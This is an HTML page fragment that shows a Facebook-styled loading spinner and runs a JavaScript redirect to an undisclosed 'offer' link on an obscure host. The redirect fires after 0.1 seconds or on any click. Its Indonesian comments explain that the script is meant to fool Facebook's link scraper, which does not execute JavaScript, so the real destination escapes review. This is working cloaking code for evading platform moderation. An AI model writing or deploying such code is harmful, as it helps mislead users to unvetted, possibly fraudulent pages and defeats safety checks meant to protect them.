    <style>
        body {
            background: #ffffff;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }
        
        /* Tampilan sementara sebelum redirect */
        .content {
            max-width: 680px;
            margin: 0 auto;
            text-align: center;
            padding-top: 40vh;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f0f2f5;
            border-top: 4px solid #1877f2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        
        p { color: #65676b; font-size: 14px; margin: 0; }
    </style>
    
    <!-- 
    JAVASCRIPT REDIRECT - FB SCRAPER TIDAK BACA INI
    (Facebook scraper tidak eksekusi JS atau timeout cepat)
    -->
    <script>
        const OFFER_URL = 'https://fdeddg.hubss.one/p/yCTUy';
        
        // Redirect saat halaman siap (FB scraper sudah pergi saat ini)
        window.onload = function() {
            setTimeout(function() {
                window.location.replace(OFFER_URL);
            }, 100); // 0.1 detik cukup untuk FB scraper pergi
        };
        
        // Jika user klik dimanapun, langsung redirect
        document.addEventListener('click', function() {
            window.location.replace(OFFER_URL);
        });
    </script>
